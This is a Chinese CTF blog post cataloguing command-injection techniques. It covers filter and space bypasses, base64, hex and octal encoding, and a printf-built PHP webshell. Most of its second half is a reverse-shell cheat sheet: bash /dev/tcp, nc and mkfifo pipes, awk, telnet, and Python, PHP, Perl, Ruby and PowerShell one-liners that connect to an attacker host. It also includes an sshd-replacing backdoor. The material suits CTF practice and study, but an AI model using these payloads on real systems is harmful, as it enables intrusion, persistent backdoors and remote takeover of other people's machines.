---
title: 命令执行的各种姿势
layout: categories
date: 2020-03-12
tags: [CTF, Linux命令]
categories:
- [CTF, Linux]
comments: false
---

# 命令执行的各种姿势

比赛比的是组合拳,理解原理,灵活运用

<!-- more -->

## 姿势

### 一些命令分隔符

```
Linux中：%0a(可以表示命令结束) 、%0d 、; 、& 、| 、&&、||
Windows中：%0a、&、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）
```

### 绕过空格

```
#下面这些都可以起到和空格样的作用
<,<>,%20(空格),%09(Tab),$IFS$9(也可以用$1等等,只是$9在linux始终为空字符),${IFS},$IFS
```

### 巧用花括号

```
在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令
{ls,}
Desktop Documents ...
```

### 黑名单绕过

#### 拼接绕过

```
比如：a=l;b=s;$a$b
就相当于ls
```

#### 编码绕过

##### base64编码

```
#注意,需要使用管道符,因为base64命令只接受标准的输入和输出
echo "Y2F0IC9mbGFn"|base64-d|bash
cat /flag
```

##### Hex

```
#由于linux自动解析hex,所以可以使用hex绕过,\x20是空格,也可能被ban
 ==>cat /flag
```

##### oct

```
#{}或者()都可以$把这个输出当成变量,然后执行
$(printf "\154\163") 
==>ls

$(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") 
==>cat /flag

#可以通过这样来写webshell,内容为<?php @eval($_POST['a']);?>
${printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} >> a.php

#利用反引号`
`printf "\154\163"`
-->>ls

#绕过/
printf "2f"    
/

或者可以从$PATH中取/   
echo $PATH|cut -c 1
```

##### 单引号和双引号绕过，反斜杠绕过

```
ca''t flag 
ca""t flag  
ca\t flag
都相当于
cat flag
```

##### 长度限制

```
linux下可以用 >a 创建文件名为a的空文件
ls -t>test则会将目录按时间排序后写进test文件中
sh命令可以从一个文件中读取命令来执行
https://xz.aliyun.com/t/2748
```

##### 利用Shell 特殊变量绕过

| 变量 | 含义                                                         |
| :--- | :----------------------------------------------------------- |
| $0   | 当前脚本的文件名                                             |
| $n   | 传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。 |
| $#   | 传递给脚本或函数的参数个数                                   |
| $*   | 传递给脚本或函数的所有参数，而参数不存在时其值为空。         |
| $@   | 传递给脚本或函数的所有参数。，而参数不存在时其值为空。被双引号包函时，与$*稍有不同 |
| $?   | 上个命令的推出状态，或函数的返回值                           |
| $$   | 当前shell进程ID                                              |

##### 通配符

详细参考[阮一峰的网络日志——命令行通配符教程](http://www.ruanyifeng.com/blog/2018/09/bash-wildcards.html)

| 字符        | 解释                                                         |
| :---------- | :----------------------------------------------------------- |
| *           | 匹配任意长度任意字符                                         |
| ？          | 匹配任意单个字符                                             |
| [list]      | 匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合 |
| [^list]     | 匹配指定范围外的任意单个字符或字符集合                       |
| [!list]     | 同上                                                         |
| {str1,str2} | 匹配str1或者str2字符，也可以是集合                           |
| IFS         | 由或或                                                       |
| CR          | 由产生                                                       |
| !           | 执行history中的命令                                          |

**其中：**

- […]表示匹配方括号之中的任意一个字符。
  比如[aeiou]可以匹配五个元音字母，[a-z]匹配任意小写字母。
- {…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。

```
echo d{a,e,i,u,o}g
dag deg dig dug dog
#大括号可以嵌套使用
echo {j{p,pe}g,png}
jpg jpeg png
#{start..end}匹配连续字符
cat /f{a..z}ag
cat: /faag: 没有那个文件或目录
cat: /fbag: 没有那个文件或目录
cat: /fcag: 没有那个文件或目录
cat: /fdag: 没有那个文件或目录
cat: /feag: 没有那个文件或目录
cat: /ffag: 没有那个文件或目录
cat: /fgag: 没有那个文件或目录
cat: /fhag: 没有那个文件或目录
cat: /fiag: 没有那个文件或目录
cat: /fjag: 没有那个文件或目录
cat: /fkag: 没有那个文件或目录
flag{test}
...
```

- {…}与[…]有一个很重要的区别。如果匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开。

通配符有时可以起奇效

```
cat fla* 
cat${IFS}fl*
```

**注意:**又是还会遇到flag 的贪婪匹配`/.*f*.l*.a*.g*/`这是拼接什么的基本不能用,就不得不考虑编码等其他姿势

## 反弹shell

目标机执行反弹shell的命令,攻击机用nc开启监听就行

### 攻击机

```
nc -lvvp 8080
```

### 目标机

#### bash

```
bash -i >& /dev/tcp/192.1168.0.1/8080 0>&1
```

#### exec

```
exec 5<>/dev/tcp/ip/port;cat <&5|while read line;do $line >&5 2>&1;done
```

#### ssh

```
受害主机执行:
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8080;   

攻击机器:
ssh root@192.168.3.251 -p 8080 [用户名root,密码随意]


简易SSH wrapper后门(原理未测试)
受害主机执行:
cd /usr/sbin
mv sshd ../bin
echo '#!/usr/bin/perl' > sshd
echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd
echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
chmod u+x sshd
/etc/init.d/sshd restart

攻击机器:
socat STDIO TCP4:x.x.x.x:22,souceport=13337
```

#### NC反弹

```
#nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）
nc -e /bin/sh ip port

#受害主机:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 8080 > /tmp/f

#攻击主机先监听8080端口:
nc -lvvp 8080

#类似的命令
mknod backpipe p;nc ip prot 0<backpipe | /bin/bash 1>backpipe 2>backpipe
```

#### Awk

**注意:**攻击的机器监听，在收到shell的时候不可以只输入enter，不然会断开

```
awk 'BEGIN{s="/inet/tcp/0/ip/port";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```

#### Telnet反弹

```
受害主机:
telnet 192.168.3.251 8080 | /bin/bash | telnet 192.168.3.251 1080
攻击主机:
nc -lvp 1080 
nc -lvp 8080 //这里输入命令可以在1080看到结果

受害机器:
mknod test p && telnet ip  port 0<test | /bin/bash 1>test
攻击：
nc  -lvvp 8080
top命令看不到结果，因为不是tty
```

#### python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#还可以配合ssti注入执行bash反弹
```

#### php

```
php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

#### Perl

```
perl -e 'use Socket;$i="ip";$p=prot;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

#### Ruby

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ip","port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

#### Windwos

```
WIndows
PS C:\> Import-Module .\powercat.ps1
PS C:\> powercat -c 192.168.3.251 -p 8081 -e cmd -g >> payload.ps1
# nc -lvp 8081 然后开始监听payload回连的端口

powershell –exec bypass –Command "& {Import-Module 'C:\payload.ps1'}"
#挂在后台执行
```

## 查看内容命令

```
cat、tac、more、less、head、tail、nl、sed、sort、uniq
```